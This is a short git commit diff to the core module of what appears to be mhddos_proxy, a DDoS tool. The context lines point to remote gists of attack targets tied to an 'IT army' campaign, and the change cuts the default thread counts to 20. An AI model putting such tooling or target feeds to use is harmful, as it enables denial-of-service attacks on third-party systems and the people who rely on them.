e8d6945c579591be4dd372157a4a3e5e642c099c
Ivan Oryshchenko <44241496+ifest1val@users.noreply.github.com>
2022-05-16 19:51:37 +0300

    1
    1

--- src/core.py
+++ src/core.py
@@ -32,8 +32,8 @@ PROXIES_URLS = (
 IT_ARMY_CONFIG_URL = 'https://gist.githubusercontent.com/ddosukraine2022/f739250dba308a7a2215617b17114be9/raw/mhdos_targets_tcp_v2.txt'
 VERSION_URL = 'https://raw.githubusercontent.com/porthole-ascend-cinnamon/mhddos_proxy/main/version.txt'
 
-LOW_PROFILE_THREADS = 1_000
-HIGH_PROFILE_THREADS = 7_500
+LOW_PROFILE_THREADS = 2_0
+HIGH_PROFILE_THREADS = 2_0
 
 DEFAULT_THREADS = LOW_PROFILE_THREADS if cpu_count() == 1 else HIGH_PROFILE_THREADS
 
